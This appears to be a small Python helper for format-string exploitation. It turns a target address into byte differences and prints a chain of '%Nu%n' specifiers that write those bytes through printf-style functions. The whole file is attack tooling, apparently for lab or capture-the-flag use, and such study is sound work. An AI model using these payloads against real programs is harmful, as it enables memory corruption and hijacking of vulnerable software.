#!/usr/bin/python3

WORDLEN = 4

def bytediff(addr):
    a = addr.lstrip("0x").rjust(WORDLEN*2, '0')
    b = [int(a[i:i+2],16) for i in range(WORDLEN*2 - 2, -1, -2)]
    diffs = [b[i+1] - b[i] + 256 * (b[i] >= b[i+1]) for i in range(WORDLEN-1)]
    print("".join(["%%%du%%n" % (d) for d in diffs]))

if __name__ == "__main__":
    import sys
    assert(len(sys.argv) == 2)
    bytediff(sys.argv[1])


